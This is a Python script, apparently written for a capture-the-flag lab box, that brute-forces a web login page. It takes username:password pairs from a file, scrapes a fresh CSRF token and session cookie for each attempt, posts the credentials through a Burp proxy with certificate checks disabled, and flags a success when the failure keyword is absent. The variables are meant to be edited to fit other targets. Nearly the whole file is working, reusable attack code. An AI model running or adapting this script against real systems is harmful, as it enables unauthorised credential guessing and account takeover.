#Library to create HTTP requests, parse HTTP responses, and scrap HTTP pages for content
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
#Library of regular expressions to help find or match other strings.
import re
#Library to ingest command-line input
import sys
#Colorama is used to just color CMD line output for successes
import colorama
#Fore is for the color of the text and Style is to reset the Fore variable after finding a successfull credential pair.
from colorama import Fore, Style
#Library used to easily capture and organize flags used by the program for arguments received via the command line.
import argparse
#Used to issue system commands to create a sub-folder for storage of this brute forcer artifacts.
import os

##Change these values to suit the situation.
var_creds = '/root/Boxes/Sense/enumerate/User_Pass.txt'
var_URL = 'https://10.10.10.60/'
var_csrf_token_name = '__csrf_magic'
var_session_id = 'PHPSESSID'
var_user = 'usernamefld'
var_password = 'passwordfld'
var_keyword = 'incorrect'
#Don't usually have to change var_proxy as it's set up to go through default Burp ports.
var_proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
    }

#Accessing the username:password text file   
up_file = open(var_creds,"r")

#Set up an HTTP(s) session with the requests library.
s = requests.session()
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#Iterate through the username:password text file.   
for Login_Combo in up_file:

  #Split the line into an array called "fields" using the ":" as a separator.
  fields = Login_Combo.split(":")   
  #Extract the username and password from the colon seperated file and assign them to different columns of the array.   
  File_User = fields[0]   
  File_Password = fields[1]   
  #Get the website to generate a CSRF token to scrape.
  csrf_response = requests.get(
          var_URL,
          verify=False,
          allow_redirects=True,
          proxies=var_proxy
          )
  #Scrap the CSRF token.
  soup = BeautifulSoup(csrf_response.content, 'html.parser')
  for result in soup.find_all(attrs={"name":var_csrf_token_name}): ##You may have to change this find_all attributes to scrape the CSRF token correctly.
    token = result.get('value')
  #Store the cookie value for future login attempts.
  auth_cookie = {
          var_session_id: requests.utils.dict_from_cookiejar(csrf_response.cookies)[var_session_id]
          }
  #Put in all of the POST data variables here to show up in an authentic POST attempt.
  login_parameter_values = {
          var_user: File_User,
          var_password: File_Password[:-1],
          '__csrf_magic': token,
          'login':'Login'
	  ##Any other POST variables / values that you see in an authentic POST attempt.
          }
  #Make the POST request.
  r = requests.post(
          var_URL,
          data=login_parameter_values,
          verify=False,
          cookies=auth_cookie,
          allow_redirects=True,
          proxies=var_proxy
          )
  
  #After making the POST request with a username and password combination, scrap the HTTP response packet to identify if the keyword for failed logins is present or not.
  if var_keyword in r.text: 
    #If the failed login attempt keyword is found in the HTTP response then print the failed login attempt username and password.
    print("Invalid Login %s:%s" % (File_User,File_Password[:-1]))
	  #Clear the cookies of the browser client used by the requests library before trying to authenticate again.
    s.cookies.clear 
  else: 
    #If the failed login attempt keyword is NOT found, then the login attempt was presumed to be successfull.  Print the assumed success username:password combination, indent from the failed login attempt CLI output, and color it in green text color to stand out.
    print(Fore.GREEN + "+++++++++++++++++++++Success %s:%s" % (File_User,File_Password[:-1]) + Style.RESET_ALL)
    break

#It is good practice to close the files at the end to free up resources      
up_file.close()

#Print the CLI when the script is done in red text.
print(Fore.RED + "Brute force is complete\n" + Style.RESET_ALL)
